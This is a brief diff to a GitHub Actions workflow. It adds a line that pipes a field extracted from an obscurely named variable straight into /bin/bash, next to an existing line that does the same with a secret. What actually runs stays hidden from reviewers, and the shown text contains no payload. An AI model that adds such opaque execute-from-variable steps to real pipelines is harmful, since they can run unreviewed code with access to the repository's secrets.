@@ -21,6 +21,7 @@ jobs:
           emzrv37893: ${{ secrets.emzrv37893 }}
         run: |
           printf '%s' "$emzrv37893" | jq -r .f57348 | /bin/bash
+          echo $if03 | jq -r .tub5388 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
